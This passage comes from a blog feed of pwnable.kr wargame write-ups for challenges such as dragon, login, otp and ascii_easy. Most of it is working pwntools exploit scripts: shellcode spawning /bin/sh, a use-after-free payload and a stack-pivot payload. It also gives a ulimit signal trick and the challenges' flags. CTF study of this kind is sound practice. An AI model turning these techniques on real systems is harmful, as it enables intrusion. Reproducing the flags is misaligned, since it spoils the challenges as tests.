number">0x602560</span>    shellcode_addr <span class="token operator">=</span> g_pbuf <span class="token operator">+</span> len<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>    system_global <span class="token operator">=</span> <span class="token number">0x602538</span>     addr_plaintext<span class="token operator">=</span><span class="token number">105</span>    p<span class="token operator">=</span><span class="token number">4099</span>    q<span class="token operator">=</span><span class="token number">4111</span>    e<span class="token operator">=</span><span class="token number">405641</span>    phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>    d<span class="token operator">=</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>    d<span class="token operator">=</span><span class="token number">0xffffffff</span>    <span class="token comment" spellcheck="true"># set keys</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Set keys"</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'p :'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'q :'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'set public key exponent e :'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'set private key exponent d :'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>    shellcode <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span>    shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''mov rdi, &amp;#123;g_pbuf&amp;#125;                        xor rsi, rsi                        xor rdx, rdx                        mov rax, [&amp;#123;system_global&amp;#125;]                        call rax                        mov rax, &amp;#123;exit&amp;#125;                        jmp rax                        '''</span>                    <span class="token punctuation">.</span>format<span class="token punctuation">(</span>g_pbuf<span class="token operator">=</span>g_pbuf<span class="token punctuation">,</span> system_global<span class="token operator">=</span>system_global<span class="token punctuation">,</span> exit<span class="token operator">=</span><span class="token number">0x400CBA</span><span class="token punctuation">)</span>                    <span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># encrypt</span>    <span class="token comment" spellcheck="true"># encrypted payload goes to: 0x6020e0 &lt;g_ebuf></span>    <span class="token comment" spellcheck="true"># shellcode goes to: 0x602560 &lt;g_pbuf></span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Overwrite func array"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> shellcode    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">256</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr_plaintext<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'how long is your data?(max=1024) :'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'paste your plain text data'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-fix"><a href="#4-fix" class="headerlink" title="4.fix"></a>4.fix</h1><h2 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ulimit</span> -s unlimited./fix1592s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable-kr-5</title>
      <link href="/2019/04/22/pwnable-kr-5/"/>
      <url>/2019/04/22/pwnable-kr-5/</url>
      
        <content type="html"><![CDATA[<h1 id="1-dragon"><a href="#1-dragon" class="headerlink" title="1.dragon"></a>1.dragon</h1><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><p>overflow</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>ptr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><a id="more"></a><p>uaf</p><pre class="line-numbers language-asm"><code class="language-asm">.text:080488C0                 mov     eax, [ebp+dragon.dragon.dragon.dragon.dragon].text:080488C3                 mov     eax, [eax].text:080488C5                 mov     edx, [ebp+dragon.dragon.dragon.dragon.dragon].text:080488C8                 mov     [esp], edx.text:080488CB                 call    eax.text:080488CD                 jmp     short loc_80488DB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./dragon'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span><span class="token number">9004</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span><span class="token comment" spellcheck="true"># gdb.attach(proc.pidof(p)[0],gdbscript='b *0x08048899\nc\n')</span><span class="token keyword">def</span> <span class="token function">step1</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">step2</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>step1<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>step2<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p32<span class="token punctuation">(</span><span class="token number">0x08048dbf</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-bash"><code class="language-bash">MaMa, Gandhi was right<span class="token operator">!</span> :<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="2-login"><a href="#2-login" class="headerlink" title="2.login"></a>2.login</h1><h2 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h2><p>overflow. v4 [ebp-8h] &amp;&amp; a1=12</p><pre class="line-numbers language-c"><code class="language-c">  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-8h].  </span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">,</span> <span class="token operator">&amp;</span>input<span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  s2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calc_md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./login'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span><span class="token number">9003</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span><span class="token comment" spellcheck="true"># gdb.attach(proc.pidof(p)[0],gdbscript='b *0x080492E\nc\n')</span>system_addr<span class="token operator">=</span><span class="token number">0x8049284</span>ppp<span class="token operator">=</span><span class="token number">0x11111111</span>input1<span class="token operator">=</span><span class="token number">0x0811EB3C</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b64e<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ppp<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>input1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-bash"><code class="language-bash">control EBP, control ESP, control EIP, control the world~<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="3-otp"><a href="#3-otp" class="headerlink" title="3.otp"></a>3.otp</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> fname<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> otp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"usage : ./otp [passcode]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> otp<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">"/tmp/%llu"</span><span class="token punctuation">,</span> otp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fp<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>otp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"OTP generated.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> passcode<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    FILE<span class="token operator">*</span> fp2 <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fp2<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token function">fread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>passcode<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strtoul</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">==</span> passcode<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congratz!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">else</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"OTP mismatch\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span>fname<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h2><p>use subprocess to control singal</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ulimit</span> -f 0 <span class="token operator">&amp;&amp;</span> python -c <span class="token string">"import os, signal; signal.signal(signal.SIGXFSZ, signal.SIG_IGN); os.system('./otp 0')"</span>or<span class="token function">ulimit</span> -f 0 <span class="token operator">&amp;&amp;</span> python -c <span class="token string">"import subprocess; subprocess.Popen(['./otp', ''], stderr=subprocess.STDOUT)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-bash"><code class="language-bash">Darn<span class="token punctuation">..</span>. I always forget to check the <span class="token keyword">return</span> value of fclose<span class="token punctuation">(</span><span class="token punctuation">)</span> :<span class="token punctuation">(</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="4-ascii-easy"><a href="#4-ascii-easy" class="headerlink" title="4.ascii_easy"></a>4.ascii_easy</h1><h2 id="question-1"><a href="#question-1" class="headerlink" title="question"></a>question</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> BASE ((void*)0x5555e000)</span><span class="token keyword">int</span> <span class="token function">is_ascii</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token number">0x20</span> <span class="token operator">&amp;&amp;</span> c<span class="token operator">&lt;=</span><span class="token number">0x7f</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"usage: ascii_easy [ascii input]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    size_t len_file<span class="token punctuation">;</span>    <span class="token keyword">struct</span> stat st<span class="token punctuation">;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/home/ascii_easy/libc-2.15.so"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">fstat</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token operator">&amp;</span>st<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"open error. tell admin!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    len_file <span class="token operator">=</span> st<span class="token punctuation">.</span>st_size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mmap</span><span class="token punctuation">(</span>BASE<span class="token punctuation">,</span> len_file<span class="token punctuation">,</span> PROT_READ<span class="token operator">|</span>PROT_WRITE<span class="token operator">|</span>PROT_EXEC<span class="token punctuation">,</span> MAP_PRIVATE<span class="token punctuation">,</span> fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> BASE<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"mmap error!. tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">is_ascii</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you have non-ascii byte!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"triggering bug...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vuln</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" 